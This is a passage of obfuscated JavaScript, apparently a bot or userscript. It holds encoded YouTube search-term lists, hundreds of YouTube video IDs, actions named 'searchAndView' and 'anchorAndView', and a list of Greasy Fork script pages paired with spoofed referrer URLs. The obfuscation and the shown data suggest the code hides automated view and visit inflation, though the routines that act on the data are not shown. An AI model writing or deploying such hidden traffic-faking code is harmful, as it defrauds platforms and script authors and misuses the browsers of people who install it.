'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms[Y(0x9, '2Px7')](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1 * 0x744 + 0x1f86 + -0x26c0)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1 * -0x4a9 + -0x1 * -0x10d + -0x5ac)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + X(0x11) + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x15e * -0x9 + 0x379 * -0x1 + -0x2b * -0x5e);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    Y(0x16, 'N2]l') + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    Y(0x6, 'IAHj') + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    Z(0xf) + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0xb) + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0xa) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + Z(0x10) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + Y(0x8, 'Y5OD') + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
